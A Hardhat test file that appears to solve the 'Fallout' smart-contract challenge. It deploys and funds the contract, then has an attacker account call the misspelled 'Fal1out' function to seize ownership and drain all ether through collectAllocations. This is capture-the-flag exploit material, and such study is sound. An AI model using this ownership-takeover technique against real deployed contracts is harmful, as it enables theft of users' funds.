import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

describe('Fallout', () => {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, user1, user2, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('Fallout');
    contract = await Factory.deploy();
    await contract.deployed();

    // add some allocated ether
    const tx = await contract.allocate({
      value: utils.parseEther('1'),
    });
    await tx.wait();
  });

  it('attack', async () => {
    // 1 - call Fal1out function
    let tx = await contract.connect(attacker).Fal1out();
    await tx.wait();

    // 2 - get all the ether
    tx = await contract.connect(attacker).collectAllocations();
    await tx.wait();

    expect(await provider.getBalance(contract.address)).to.equal(0);
  });
});
